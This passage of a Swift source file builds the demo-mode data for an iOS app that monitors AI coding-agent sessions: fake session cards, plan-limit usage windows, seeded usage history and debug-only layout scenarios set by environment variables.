//
//  DemoData.swift
//  AgStatus
//
//  Believable fake sessions for demo mode, plus a tick() that walks them
//  through plausible status transitions so the board feels alive, and the
//  Focus listeners those sessions would see.
//

import Foundation

enum DemoData {

    /// The two machines the demo's Focus-enabled sessions run on: a "Mac"
    /// whose listener is connected, and a "MacBook" that went away five
    /// minutes ago — so both faces of the "Bring to front" control show.
    static let onlineMachine = Host.Machine(id: "9f2c1b7e4d3a8f0c5e6b2a1d9c8f7e6b", name: "Mac")
    static let offlineMachine = Host.Machine(id: "0c4e7a19b3d25f68e1a7c9d04b6f2e83", name: "MacBook")

    /// Four sessions that look like a real evening of agent work.
    ///
    /// Their token totals are sized to their ages — roughly what a session of
    /// that length actually spends — and span the formats the card has to
    /// render: hundreds of thousands, millions, and (data-pipeline) a session
    /// with NO total at all. That last one is not an oversight. The totals
    /// arrive on the hook's own 15-minute throttle, so a card younger than that
    /// legitimately has no figure yet, and the design gets reviewed here: the
    /// absent case has to be in front of the owner, showing no number rather
    /// than a zero or a dash.
    static func initialSessions() -> [Session] {
        #if DEBUG
        return agedForScreenshots(seededSessions())
        #else
        return seededSessions()
        #endif
    }

    private static func seededSessions() -> [Session] {
        #if DEBUG
        if usesPool { return scenarioSessions() }
        #endif
        let now = nowMillis()
        return [
            Session(id: "demo-api-server",
                    name: "api-server",
                    status: .coding,
                    message: "Editing src/auth/token.ts",
                    project: "acme-api",
                    createdAt: now - 42 * 60_000,
                    updatedAt: now - 15_000,
                    host: Host(machine: onlineMachine,
                               app: Host.App(slug: "agterm", name: "agterm", kind: "terminal")),
                    tokens: 486_200),
            // Finished eight minutes ago and nobody has looked: the card that
            // shows the closing beat when it finally moves.
            //
            // It deliberately reports no host. The beat sits in the same line
            // as the offline note and yields to it — a machine you cannot reach
            // is more actionable than how long something waited — so a card
            // with an offline machine can never display one. `data-pipeline`
            // has exactly that shape, which is why the beat needs a second card
            // to be visible at all here.
            Session(id: "demo-webapp",
                    name: "webapp",
                    status: .done,
                    message: "Finished — 12 files changed",
                    project: "acme-web",
                    createdAt: now - 95 * 60_000,
                    updatedAt: now - 8 * 60_000,
                    tokens: 1_438_000),
            // Eighteen minutes old and nothing reported for it yet: the card
            // that must show no number.
            Session(id: "demo-data-pipeline",
                    name: "data-pipeline",
                    status: .blocked,
                    message: "Needs permission approval",
                    project: "etl-jobs",
                    createdAt: now - 18 * 60_000,
                    updatedAt: now - 3 * 60_000,
                    host: Host(machine: offlineMachine,
                               app: Host.App(slug: "iterm2", name: "iTerm2", kind: "terminal"))),
            // A Codex session so the demo board shows both agents' limit
            // blocks, not just Claude's. Its total runs higher than a Claude
            // session of the same length because Codex counts cache reads in
            // its own cumulative figure — the two are not comparable, and the
            // demo should not imply they are.
            Session(id: "demo-docs-site",
                    name: "docs-site",
                    status: .done,
                    message: "All tasks complete — 12 files changed",
                    project: "docs",
                    source: "codex",
                    createdAt: now - 3 * 3_600_000,
                    updatedAt: now - 26 * 60_000,
                    tokens: 2_830_000),
        ]
    }

    /// Listener presence as the store keeps it: what a `machines` frame would
    /// seed, plus the offline `machine` frame the board saw five minutes ago.
    static func machines() -> [String: MachinePresence] {
        let now = nowMillis()
        let online = MachinePresence(id: onlineMachine.id, name: onlineMachine.name,
                                     online: true, since: now - 2 * 3_600_000)
        let offline = MachinePresence(id: offlineMachine.id, name: offlineMachine.name,
                                      online: false, lastSeen: now - 5 * 60_000)
        #if DEBUG
        if usesPool { return scenarioMachines([online, offline], now: now) }
        #endif
        return [online.id: online, offline.id: offline]
    }

    /// Plan-limit bars matching a busy-but-not-throttled evening: one block
    /// per agent, each with its own session, all-models and per-model windows.
    static func usage() -> [UsageInfo] {
        let now = nowMillis()
        var claudeWeek: Double = 62
        #if DEBUG
        // AGSTATUS_DEMO_LIMITS=hi puts Claude's weekly window past the 85%
        // where a limit is drawn in the alarm's red. That is the capture the
        // head's blocked edge was designed against: a head with a red bar and
        // nothing blocked must not read like a head that needs you.
        let limits = ProcessInfo.processInfo.environment["AGSTATUS_DEMO_LIMITS"]
        if limits == "hi" { claudeWeek = 91 }
        var all = claudeAndCodex(now: now, claudeWeek: claudeWeek)
        if scenario == .threeLimits { all.append(geminiUsage(now: now)) }
        // AGSTATUS_DEMO_LIMITS=many gives Codex six windows, the most one
        // report may carry (MAX_USAGE_WINDOWS in src/store.ts): the head a
        // phone must not pin whole. A number, 1 to 6, gives it the first that
        // many, so either side of BoardArrangement.narrowPinnedWindows can be
        // captured.
        if let count = limits == "many" ? 6 : limits.flatMap(Int.init), (1...6).contains(count) {
            let six = codexSixWindows(now: now)
            let windows = Array(six.windows.prefix(count))
            all = all.map { $0.source == "codex" ? UsageInfo(source: "codex", windows: windows, updatedAt: now) : $0 }
        }
        return all
        #else
        return claudeAndCodex(now: now, claudeWeek: claudeWeek)
        #endif
    }

    #if DEBUG
    /// Codex at the six windows a report may carry: the all-models week, a
    /// session and a week for each of two models, and a code-review week.
    private static func codexSixWindows(now: Int64) -> UsageInfo {
        let week = now + 4 * 86_400_000 + 2 * 3_600_000
        return UsageInfo(source: "codex",
                         windows: [
                             UsageWindow(id: "week", label: "Weekly (all models)", usedPct: 47, resetsAt: week),
                             UsageWindow(id: "session_gpt_6_astra", label: "Session (GPT-6-Astra)",
                                         usedPct: 22, resetsAt: now + 96 * 60_000),
                             UsageWindow(id: "week_gpt_6_astra", label: "Weekly (GPT-6-Astra)",
                                         usedPct: 38, resetsAt: week),
                             UsageWindow(id: "session_gpt_6_mini", label: "Session (GPT-6-Mini)",
                                         usedPct: 9, resetsAt: now + 41 * 60_000),
                             UsageWindow(id: "week_gpt_6_mini", label: "Weekly (GPT-6-Mini)",
                                         usedPct: 64, resetsAt: week),
                             UsageWindow(id: "week_review", label: "Weekly (code review)",
                                         usedPct: 12, resetsAt: week),
                         ],
                         updatedAt: now)
    }

    /// AGSTATUS_DEMO_STALE=<minutes> — every working session (planning,
    /// coding, testing) last reported that long ago. Past
    /// `SessionCardView.staleAfter`, ten minutes, that is a stale card, which
    /// the demo never shows otherwise: its sessions are seconds to a few
    /// minutes old. Pair it with AGSTATUS_DEMO_FREEZE, or the first tick
    /// brings a session back to life.
    private static func agedForScreenshots(_ sessions: [Session]) -> [Session] {
        guard let minutes = ProcessInfo.processInfo.environment["AGSTATUS_DEMO_STALE"].flatMap(Int.init),
              minutes > 0 else { return sessions }
        let at = nowMillis() - Int64(minutes) * 60_000
        return sessions.map { session in
            guard session.status.isActive else { return session }
            var aged = session
            aged.updatedAt = min(session.updatedAt, at)
            aged.createdAt = min(session.createdAt, aged.updatedAt)
            return aged
        }
    }
    #endif

    private static func claudeAndCodex(now: Int64, claudeWeek: Double) -> [UsageInfo] {
        [
            UsageInfo(source: "claude",
                      windows: [
                          UsageWindow(id: "session",
                                      label: "Current session",
                                      usedPct: 34,
                                      resetsAt: now + 137 * 60_000),
                          UsageWindow(id: "week",
                                      label: "Weekly (all models)",
                                      usedPct: claudeWeek,
                                      resetsAt: now + 2 * 86_400_000 + 5 * 3_600_000),
                          UsageWindow(id: "week_fable",
                                      label: "Weekly (Fable)",
                                      usedPct: 41,
                                      resetsAt: now + 2 * 86_400_000 + 5 * 3_600_000),
                      ],
                      updatedAt: now),
            UsageInfo(source: "codex",
                      windows: [
                          UsageWindow(id: "week",
                                      label: "Weekly (all models)",
                                      usedPct: 47,
                                      resetsAt: now + 4 * 86_400_000 + 2 * 3_600_000),
                          UsageWindow(id: "session_gpt_6_astra",
                                      label: "Session (GPT-6-Astra)",
                                      usedPct: 22,
                                      resetsAt: now + 96 * 60_000),
                          UsageWindow(id: "week_gpt_6_astra",
                                      label: "Weekly (GPT-6-Astra)",
                                      usedPct: 38,
                                      resetsAt: now + 4 * 86_400_000 + 2 * 3_600_000),
                      ],
                      updatedAt: now),
        ]
    }

    /// Offline stand-in for `/api/usage/history`: a month of plausible token
    /// spend per project, with the plan-limit readings recorded over it. The
    /// limit series deliberately start partway through the range — a board only
    /// knows the limits it has actually seen — and each one lands on the same
    /// percentage the demo bars show, so the two screens agree. Seeded, so the
    /// demo (and its screenshots) look the same on every launch.
    static func usageHistory(days: Int = UsageHistory.defaultDays) -> UsageHistory {
        let grid = UsageHistory.dayRange(days)
        var rng = SeededGenerator(seed: 0x51E5_A6ED_D0C5)
        var series: [UsageHistorySeries] = []
        var projects: [UsageProjectDay] = []

        for plan in plansForScreenshots {
            for window in plan.windows {
                series.append(limitSeries(source: plan.source, window: window, grid: grid, rng: &rng))
            }
            for project in plan.projects {
                projects.append(contentsOf: tokenRows(source: plan.source,
                                                      project: project,
                                                      grid: grid,
                                                      rng: &rng))
            }
        }
        // Quiet days, applied to the UNION rather than per project.
        //
        // `tokenRows` already skips about one day in five, but it rolls
        // independently for every project — and a day counts as active if ANY
        // project spent. With several projects the gaps almost never line up,
        // so the union covered nearly every day and the demo streak read
        // "Platinum, 90 days active" on launch: the ladder maxed, no tier below
        // the top reachable, and the forgiveness rule never exercised in the
        // one place it can actually be looked at.
        //
        // These offsets are counted back from today and chosen rather than
        // rolled, so the demo board is the same every launch and shows a
        // specific, reviewable shape: three consecutive quiet days nineteen
        // back end the run, and two isolated ones inside it are forgiven. That
        // lands on nineteen days — Silver, partway to Gold — which is a state
        // with something to draw, unlike the top rung.
        let quietOffsets: Set<Int> = [3, 11, 19, 20, 21]
        let quietDays = Set(quietOffsets.compactMap { offset -> String? in
            let index = grid.count - 1 - offset
            return grid.indices.contains(index) ? grid[index] : nil
        })
        let spent = projects.filter { !quietDays.contains($0.day) }

        return UsageHistory(days: grid.count, history: series, projects: spent)
    }

    /// What each demo agent has been spending, and on what.
    private struct DemoPlan {
        let source: String
        /// One per limit window: its id, how far back the board first recorded
        /// it, where it stands today, and whether it accrues over a week.
        let windows: [(id: String, startsDaysAgo: Int, endPct: Double, weekly: Bool)]
        /// Projects and their share of this agent's daily spend.
        let projects: [(name: String, weight: Double)]
    }

    /// `demoPlans`, except that AGSTATUS_DEMO_LIMITS=many (or 1–6), which
    /// gives Codex's head that many windows, gives its usage history the same
    /// ones: the chart's six line patterns can only be looked at with six.
    /// AGSTATUS_DEMO_FIRST_DAY=all, or a comma-separated list of window ids,
    /// starts those windows' history today, with a single reading: the
    /// chart's marks can only be looked at on a board's first day.
    private static var plansForScreenshots: [DemoPlan] {
        #if DEBUG
        var plans = demoPlans
        let limits = ProcessInfo.processInfo.environment["AGSTATUS_DEMO_LIMITS"]
        if let count = limits == "many" ? 6 : limits.flatMap(Int.init), (1...6).contains(count) {
            plans = plans.map { plan in
                guard plan.source == "codex" else { return plan }
                return DemoPlan(source: plan.source,
                                windows: Array(codexSixHistory.prefix(count)),
                                projects: plan.projects)
            }
        }
        if let firstDay = ProcessInfo.processInfo.environment["AGSTATUS_DEMO_FIRST_DAY"] {
            let ids = Set(firstDay.split(separator: ",").map(String.init))
            plans = plans.map { plan in
                DemoPlan(source: plan.source,
                         windows: plan.windows.map { window in
                             guard firstDay == "all" || ids.contains(window.id) else { return window }
                             return (id: window.id, startsDaysAgo: 1, endPct: window.endPct, weekly: window.weekly)
                         },
                         projects: plan.projects)
            }
        }
        return plans
        #else
        return demoPlans
        #endif
    }

    #if DEBUG
    /// `codexSixWindows`' windows as history, each ending on its head's value.
    private static let codexSixHistory: [(id: String, startsDaysAgo: Int, endPct: Double, weekly: Bool)] = [
        ("week", 16, 47, true),
        ("session_gpt_6_astra", 6, 22, false),
        ("week_gpt_6_astra", 16, 38, true),
        ("session_gpt_6_mini", 5, 9, false),
        ("week_gpt_6_mini", 12, 64, true),
        ("week_review", 9, 12, true),
    ]
    #endif

    private static let demoPlans: [DemoPlan] = [
        DemoPlan(source: "claude",
                 windows: [("session", 9, 34, false),
                           ("week", 22, 62, true),
                           ("week_fable", 22, 41, true)],
                 projects: [("acme-api", 1.0),
                            ("acme-web", 0.66),
                            ("etl-jobs", 0.31),
                            ("infra-scripts", 0.12)]),
        DemoPlan(source: "codex",
                 windows: [("week", 16, 47, true),
                           ("session_gpt_6_astra", 6, 22, false),
                           ("week_gpt_6_astra", 16, 38, true)],
                 projects: [("docs", 1.0), ("acme-web", 0.42)]),
    ]

    /// A step function: one reading per day, kept only when it changed.
    private static func limitSeries(source: String,
                                    window: (id: String, startsDaysAgo: Int, endPct: Double, weekly: Bool),
                                    grid: [String],
                                    rng: inout SeededGenerator) -> UsageHistorySeries {
        let first = max(0, grid.count - window.startsDaysAgo)
        let now = nowMillis()
        var value = Double.random(in: 4...12, using: &rng)
        var last: Double?
        var points: [UsageHistoryPoint] = []

        for index in first..<grid.count {
            if window.weekly {
                // Weekly caps saw-tooth: they climb all week, then reset.
                if (grid.count - 1 - index) % 7 == 6 {
                    value = Double.random(in: 2...9, using: &rng)
                } else {
                    value = min(96, value + Double.random(in: 3...13, using: &rng))
                }
            } else {
                // A session window is short-lived; each day stands on its own.
                value = Double.random(in: 6...58, using: &rng)
            }
            // Today's reading is the one the board's bars already show.
            let reading = (index == grid.count - 1 ? window.endPct : value).rounded()
            guard reading != last else { continue }
            last = reading
            let at = min(now, UsageHistory.dayStartMillis(grid[index]) + 18 * 3_600_000)
            points.append(UsageHistoryPoint(at: at, usedPct: reading))
        }
        return UsageHistorySeries(source: source, windowId: window.id, points: points)
    }

    /// Absolute per-day totals, with the quiet days a real month has.
    private static func tokenRows(source: String,
                                  project: (name: String, weight: Double),
                                  grid: [String],
                                  rng: inout SeededGenerator) -> [UsageProjectDay] {
        var rows: [UsageProjectDay] = []
        for (index, day) in grid.enumerated() {
            if Double.random(in: 0..<1, using: &rng) < 0.18 { continue } // a day off
            let ramp = 0.55 + 0.45 * Double(index) / Double(max(1, grid.count - 1))
            let jitter = Double.random(in: 0.45...1.45, using: &rng)
            let tokens = (26_000_000 * project.weight * ramp * jitter).rounded()
            rows.append(UsageProjectDay(source: source, project: project.name, day: day, tokens: tokens))
        }
        return rows
    }

    /// splitmix64 — a few lines of deterministic randomness, so the demo screen
    /// is the same every time without pulling in a dependency.
    private struct SeededGenerator: RandomNumberGenerator {
        private var state: UInt64

        init(seed: UInt64) { state = seed }

        mutating func next() -> UInt64 {
            state &+= 0x9E37_79B9_7F4A_7C15
            var z = state
            z = (z ^ (z >> 30)) &* 0xBF58_476D_1CE4_E5B9
            z = (z ^ (z >> 27)) &* 0x94D0_49BB_1331_11EB
            return z ^ (z >> 31)
        }
    }

    /// Advances a random subset of sessions (at least one) along plausible
    /// transitions, refreshing messages and updatedAt. An emptied demo board
    /// re-seeds itself so the demo never dead-ends — with whatever the launch
    /// seeded it with, which for the debug `empty` scenario is nothing.
    static func tick(_ sessions: [Session]) -> [Session] {
        #if DEBUG
        if isFrozen { return sessions }
        #endif
        guard !sessions.isEmpty else { return initialSessions() }
        let now = nowMillis()
        var updated = sessions
        var changedAny = false

        for index in updated.indices where Double.random(in: 0..<1) < 0.45 {
            updated[index] = advance(updated[index], at: now)
            changedAny = true
        }
        if !changedAny, let index = updated.indices.randomElement() {
            updated[index] = advance(updated[index], at: now)
        }
        return updated
    }

    /// A believable timeline for a demo session, ending in its current state.
    static func history(for session: Session) -> [HistoryEvent] {
        #if DEBUG
        if let board = subtaskScenario, session.id == board.focus {
            return subtaskTimeline(for: session)
        }
        #endif
        // A full session's worth of steps: enough to fill the timeline on the
        // largest iPhone, and to show a blocked stretch resolving.
        let steps: [(AgentStatus, String, Int64)] = [
            (.idle, "Session started", 46),
            (.planning, "Reading the codebase…", 44),
            (.planning, "Drafting an implementation plan", 40),
            (.coding, "Editing src/auth/token.ts", 35),
            (.coding, "Implementing retry with backoff", 31),
            (.testing, "npm test — 41 passing, 2 failing", 26),
            (.coding, "Fixing null check in parser.js", 22),
            (.blocked, "Needs permission approval", 18),
            (.coding, "Refactoring api/routes.ts", 14),
            (.testing, "npm test — 42 passing, 1 pending", 9),
            (.coding, "Writing SessionStore.swift", 5),
        ]
        var events: [HistoryEvent] = []
        for (index, step) in steps.enumerated() {
            events.append(HistoryEvent(seq: Int64(index),
                                       status: step.0,
                                       message: step.1,
                                       at: session.updatedAt - step.2 * 60_000))
        }
        events.append(HistoryEvent(seq: Int64(steps.count),
                                   status: session.status,
                                   message: session.message,
                                   at: session.updatedAt))
        return events.reversed() // newest first, like the server
    }

    // MARK: Scenarios

    #if DEBUG
    /// The boards the per-agent layout was designed against, by name.
    ///
    /// `docs/design/prototypes/agent-sections.html` is the agreed design, and
    /// it draws seven boards: the demo, and six that each put a different
    /// strain on the layout. AGSTATUS_DEMO_SCENARIO=<name> starts demo mode on
    /// the same one — the same sessions, card for card, from the same pool —
    /// so a simulator capture can be laid beside the prototype's and differ
    /// only where the implementation does.
    ///
    /// Debug builds only, like every other launch variable here. `demo` is the
    /// default and is the App Store demo board, untouched.
    ///
    /// The subagent boards come from the 1.7 design instead,
    /// `docs/design/prototypes/subtasks.html`: its `BASE` board around one
    /// card, and that card in each of its `SCENARIOS` — the same subagents,
    /// row for row, in the same order and with the same counts.
    ///
    /// The launch variables that go with it, all read only in a debug build:
    ///   AGSTATUS_DEMO_SCENARIO  demo | busy | lopsided | solo | three |
    ///                           three-limits | long | empty, or a subagent
    ///                           board: subtasks | subtasks-ten |
    ///                           subtasks-thirty | subtasks-blocked |
    ///                           subtasks-failed | subtasks-finished |
    ///                           subtasks-background | subtasks-nested |
    ///                           subtasks-minimal | subtasks-codex |
    ///                           subtasks-long
    ///   AGSTATUS_DEMO_BLOCKED   claude (the first agent's blocked sessions
    ///                           are working instead) | none (nobody is blocked)
    ///   AGSTATUS_DEMO_LIMITS    hi (Claude's weekly limit at 91%) | many
    ///                           (Codex reports six windows, and its usage
    ///                           history has six lines) | 1…6 (that many of
    ///                           the six)
    ///   AGSTATUS_DEMO_FIRST_DAY all | <window ids, comma-separated> (those
    ///                           windows' usage history starts today, with a
    ///                           single reading, as on a board's first day)
    ///   AGSTATUS_DEMO_STALE     <minutes> (every working session last
    ///                           reported that long ago: past 10, stale)
    ///   AGSTATUS_DEMO_TITLES    1 (Claude's cards carry session titles, as
    ///                           the Claude app names them, with the folder
    ///                           as the "in <repo>" — any scenario)
    ///   AGSTATUS_DEMO_FREEZE    1 (the demo stops ticking, so a capture
    ///                           cannot race a status change)
    ///   AGSTATUS_BOARD_WIDTH    <points> (BoardView: clamps the board, so a
    ///                           full-screen iPad can stand in for Split View)
    ///   AGSTATUS_DEMO_CONNECTION live | connecting | idle | gone (BoardView:
    ///                           the toolbar's connection lamp, in that
    ///                           state, where the DEMO badge would be;
    ///                           connecting is drawn as reconnecting)
    ///   AGSTATUS_JUMP           <source> (BoardView: presses that agent's
    ///                           alarm once the board is laid out)
    ///   AGSTATUS_ANNOUNCE_BLOCKS 1 (BoardView: says a new block aloud as if
    ///                           VoiceOver were running, which in the
    ///                           simulator it never is; the log category
    ///                           `blocks` records what was said)
    ///   AGSTATUS_USAGE_SCROLL   projects | note (UsageDetailView, opened
    ///                           with AGSTATUS_OPEN_USAGE: scrolls to that
    ///                           part, which at the accessibility sizes is
    ///                           below a phone's first screen)
    ///   AGSTATUS_OPEN_HISTORY   1 | <session id> (BoardView: opens the first
    ///                           card's session screen, or that session's)
    ///   AGSTATUS_OPEN_USAGE     <source> (BoardView: opens that agent's usage)
    ///   AGSTATUS_OPEN_SUBTASK   <n> (BoardView: opens the session screen at
    ///                           subagent number n, as tapping its row does)
    ///   AGSTATUS_EXPAND_SUBTASKS 1 (BoardView: opens every card's subagent
    ///                           list in place, as its footer does)
    enum Scenario: String {
        case demo
        /// Five and four: two full columns, something blocked in each.
        case busy
        /// Seven and one: uneven columns, and one card whose dismissal takes
        /// its agent — and its column — off the board.
        case lopsided
        /// One agent: nothing to put beside it.
        case solo
        /// Three agents, the third reporting no limits.
        case three
        /// The same three agents, every one reporting limits. Not one of the
        /// prototype's boards: it is the phone's worst case for pinned heads,
        /// which the prototype never drew, and why a phone pins no more than
        /// two (`BoardArrangement.narrowPinnedHeads`).
        case threeLimits = "three-limits"
        /// Worktree names, which is what a session is called when it runs in
        /// one, and which are longer than any column.
        case long
        /// Nothing running. The heads are the limits and nothing else.
        case empty

        // The subagent boards: the prototype's scenarios of the same names.
        /// Two from the Agent tool.
        case subtasks
        /// A workflow, ten running and fifteen done: the footer.
        case subtasksTen = "subtasks-ten"
        /// Thirty at once, the most the owner's Mac has run.
        case subtasksThirty = "subtasks-thirty"
        /// The ten, one of them waiting on approval.
        case subtasksBlocked = "subtasks-blocked"
        /// One failed, still listed.
        case subtasksFailed = "subtasks-failed"
        /// Every one finished, the turn still going: only the count.
        case subtasksFinished = "subtasks-finished"
        /// The turn over and two still working: WORKING.
        case subtasksBackground = "subtasks-background"
        /// One started by another, listed flat.
        case subtasksNested = "subtasks-nested"
        /// Minimal mode: numbered, and tool names for activities.
        case subtasksMinimal = "subtasks-minimal"
        /// Codex sub-agents, by their nicknames.
        case subtasksCodex = "subtasks-codex"
        /// Agent-tool descriptions at their real lengths.
        case subtasksLong = "subtasks-long"
    }

    static let scenario = Scenario(
        rawValue: ProcessInfo.processInfo.environment["AGSTATUS_DEMO_SCENARIO"] ?? ""
    ) ?? .demo

    /// AGSTATUS_DEMO_FREEZE=1 — `tick` does nothing, so the board stays as it
    /// was seeded. Without it a capture is a race against the next status
    /// change, and no two would ever match.
    static let isFrozen = ProcessInfo.processInfo.environment["AGSTATUS_DEMO_FREEZE"] == "1"

    /// AGSTATUS_DEMO_TITLES=1 — Claude's cards are named by session titles.
    ///
    /// The prototype's pool predates titles and names every card by its
    /// folder. A real board no longer looks like that: the Claude app titles
    /// every session, and a title runs to several words where a folder name
    /// was one. Without this the demo shows nothing longer than a worktree
    /// slug, and the card's two-line name and its meta line's priorities have
    /// nothing to be checked against.
    static let showsTitles = ProcessInfo.processInfo.environment["AGSTATUS_DEMO_TITLES"] == "1"

    /// The board's sessions come from the pool below rather than from the
    /// App Store demo, which a plain launch leaves untouched.
    private static var usesPool: Bool { scenario != .demo || showsTitles }

    /// A third agent's limits, as a Gemini plan reports them.
    private static func geminiUsage(now: Int64) -> UsageInfo {
        UsageInfo(source: "gemini",
                  windows: [
                      UsageWindow(id: "daily", label: "Daily requests", usedPct: 18,
                                  resetsAt: now + 9 * 3_600_000),
                      UsageWindow(id: "minute", label: "Per minute", usedPct: 5,
                                  resetsAt: now + 40_000),
                  ],
                  updatedAt: now)
    }

    /// Two more machines for the scenarios, both with a listener connected.
    private static let studioMachine = Host.Machine(id: "5a1d93c07e2b4f86a0c3d7e915b4f260", name: "Studio")
    private static let laptopMachine = Host.Machine(id: "c7e04b1a96d3f25870b1e4a3d92c6f15", name: "MacBook Pro")

    /// One card of the prototype's pool. `age` is seconds since its last
    /// update; `calm` is what a blocked session is doing on a board where it
    /// is not blocked.
    private struct Pooled {
        let id: String
        let source: String
        let name: String
        let status: AgentStatus
        let message: String
        let age: Int64
        var machine: Host.Machine?
        /// Only when the session has moved; otherwise it is where it started,
        /// and the card says nothing about it.
        var project: String?
        var tokens: Int64?
        var calm: (status: AgentStatus, message: String)?
        /// What the Claude app calls it, under AGSTATUS_DEMO_TITLES. Claude
        /// cards only: Codex does not title its sessions.
        var title: String?
    }

    /// The prototype's `POOL`, in its order and under its ids.
    private static let pool: [Pooled] = [
        Pooled(id: "api", source: "claude", name: "api-server", status: .coding,
               message: "Editing src/auth/token.ts", age: 15,
               machine: onlineMachine, project: "acme-api", tokens: 486_200,
               title: "Fix token refresh race in the auth middleware"),
        Pooled(id: "pipe", source: "claude", name: "data-pipeline", status: .blocked,
               message: "Needs permission approval", age: 180,
               machine: offlineMachine, project: "etl-jobs",
               calm: (.coding, "Backfilling the March partitions"),
               title: "Backfill March partitions for the events table"),
        Pooled(id: "web", source: "claude", name: "webapp", status: .done,
               message: "Finished — 12 files changed", age: 480,
               project: "acme-web", tokens: 1_438_000,
               title: "Migrate checkout to the new design tokens"),
        Pooled(id: "bill", source: "claude", name: "billing-worker", status: .testing,
               message: "Running 214 tests — 3 failing", age: 60,
               machine: studioMachine, tokens: 912_400,
               title: "Investigate failing proration tests in the billing worker"),
        Pooled(id: "ios", source: "claude", name: "ios-app", status: .planning,
               message: "Drafting the push-token migration plan", age: 300,
               machine: onlineMachine, tokens: 88_100,
               title: "Plan the push-token migration for iOS 26"),
        Pooled(id: "infra", source: "claude", name: "infra", status: .idle,
               message: "Session started", age: 720,
               machine: onlineMachine),
        Pooled(id: "tokens", source: "claude", name: "design-tokens", status: .done,
               message: "Finished — 4 files changed", age: 1860,
               machine: studioMachine, tokens: 220_500),
        Pooled(id: "docs", source: "codex", name: "docs-site", status: .done,
               message: "All tasks complete — 12 files changed", age: 1560,
               project: "docs", tokens: 2_830_000),
        Pooled(id: "land", source: "codex", name: "landing", status: .coding,
               message: "Rewriting the pricing table", age: 20,
               machine: onlineMachine, tokens: 312_700),
        Pooled(id: "sdk", source: "codex", name: "sdk-python", status: .testing,
               message: "pytest -k retry — 41 passed", age: 120,
               machine: studioMachine, tokens: 540_300),
        Pooled(id: "search", source: "codex", name: "search-indexer", status: .blocked,
               message: "Approve: cargo publish --dry-run", age: 360,
               machine: studioMachine, tokens: 2_100_000,
               calm: (.testing, "cargo test — 212 passed")),
        Pooled(id: "evals", source: "gemini", name: "notebook-evals", status: .coding,
               message: "Editing eval/harness.py", age: 70,
               machine: onlineMachine),
        Pooled(id: "tf", source: "gemini", name: "terraform-live", status: .blocked,
               message: "Approve: terraform plan", age: 240,
               machine: studioMachine,
               calm: (.coding, "Writing modules/vpc/main.tf")),
        Pooled(id: "wt1", source: "claude", name: "session-organization-agents-c27901", status: .coding,
               message: "Editing ios/AgStatus/BoardView.swift", age: 10,
               machine: laptopMachine, project: "claude-status", tokens: 1_100_000,
               title: "Session organization by agent"),
        Pooled(id: "wt2", source: "claude", name: "session-organization-agents-b1f44e", status: .blocked,
               message: "Approve: xcodebuild -scheme AgStatus test", age: 130,
               machine: laptopMachine, project: "claude-status", tokens: 640_800,
               calm: (.testing, "xcodebuild test — 318 passed"),
               title: "Fix listener reinstall leaving Focus stopped"),
        Pooled(id: "wt3", source: "claude", name: "claude-status-dashboard-release-1.6", status: .done,
               message: "Finished — 23 files changed", age: 840,
               machine: studioMachine, tokens: 3_400_000,
               title: "Investigate why the SSE stream drops after the iPad wakes from sleep"),
        Pooled(id: "wt4", source: "codex", name: "agstatus-listener-windows-terminal-focus", status: .testing,
               message: "npm test -- focus/wt — 57 passed", age: 80,
               machine: studioMachine, tokens: 402_600),
    ]

    /// The prototype's `SCENARIOS`: which cards are on which board.
    private static var scenarioCards: [Pooled] {
        let ids: [String]
        switch scenario {
        case .demo: ids = ["api", "pipe", "web", "docs"]
        case .busy: ids = ["api", "bill", "pipe", "ios", "web", "land", "sdk", "search", "docs"]
        case .lopsided: ids = ["api", "bill", "pipe", "ios", "web", "infra", "tokens", "docs"]
        case .solo: ids = ["api", "bill", "pipe", "web"]
        case .three, .threeLimits: ids = ["api", "pipe", "web", "land", "docs", "evals", "tf"]
        case .long: ids = ["wt1", "wt2", "wt3", "wt4", "docs"]
        case .empty: ids = []
        // Their own board, not the pool's — see `subtaskBoard`.
        case .subtasks, .subtasksTen, .subtasksThirty, .subtasksBlocked, .subtasksFailed,
             .subtasksFinished, .subtasksBackground, .subtasksNested, .subtasksMinimal,
             .subtasksCodex, .subtasksLong: ids = []
        }
        return ids.compactMap { id in pool.first { $0.id == id } }
    }

    /// Whether `card` is one the launch asked to be quiet.
    ///
    /// AGSTATUS_DEMO_BLOCKED=none calms every blocked session; `claude` calms
    /// only the first agent's — the prototype's "Claude quiet", which leaves
    /// one head with an alarm beside one without, the comparison the blocked
    /// edge exists for.
    private static func isCalmed(_ card: Pooled, among cards: [Pooled]) -> Bool {
        guard card.calm != nil else { return false }
        switch ProcessInfo.processInfo.environment["AGSTATUS_DEMO_BLOCKED"] {
        case "none": return true
        case "claude": return card.source == cards.map(\.source).min()
        default: return false
        }
    }

    private static func scenarioSessions() -> [Session] {
        let now = nowMillis()
        if let board = subtaskScenario { return subtaskBoard(board, now: now) }
        let cards = scenarioCards
        return cards.map { card in
            let calm = isCalmed(card, among: cards) ? card.calm : nil
            return Session(id: card.id,
                           name: showsTitles ? card.title ?? card.name : card.name,
                           status: calm?.status ?? card.status,
                           message: calm?.message ?? card.message,
                           // A session that stayed where it started reports
                           // its own name, which is what the card reads as
                           // "has not moved". Under a title that folder is
                           // no longer the name, and reads as "in <folder>".
                           project: card.project ?? card.name,
                           source: card.source,
                           createdAt: now - (card.age + 40 * 60) * 1000,
                           updatedAt: now - card.age * 1000,
                           host: card.machine.map {
                               Host(machine: $0,
                                    app: Host.App(slug: "agterm", name: "agterm", kind: "terminal"))
                           },
                           tokens: card.tokens)
        }
    }

    /// The scenarios' machines: the demo's two, the two above, and — on a
    /// board where data-pipeline has been calmed — its MacBook back online,
    /// because the prototype's calm card is a working one with a live Focus
    /// control, not a quiet card on a dead machine.
    private static func scenarioMachines(_ demo: [MachinePresence], now: Int64) -> [String: MachinePresence] {
        let cards = scenarioCards
        let woken = cards.contains { $0.machine == offlineMachine && isCalmed($0, among: cards) }
        var all = demo.map { presence -> MachinePresence in
            guard woken, presence.id == offlineMachine.id else { return presence }
            return MachinePresence(id: presence.id, name: presence.name, online: true,
                                   since: now - 20 * 60_000)
        }
        for machine in [studioMachine, laptopMachine] {
            all.append(MachinePresence(id: machine.id, name: machine.name, online: true,
                                       since: now - 2 * 3_600_000))
        }
        return Dictionary(all.map { ($0.id, $0) }) { first, _ in first }
    }

    // MARK: Subagent scenarios

    /// One of the subagent prototype's `SCENARIOS`: the card it judges, what
    /// that card's own session last said, and its subagents.
    struct SubtaskBoard {
        /// Whose subagents they are, which is what a tick starts more of.
        enum Kind { case agent, workflow, minimal, codex }

        /// The card that carries them: "F", or for Codex "X".
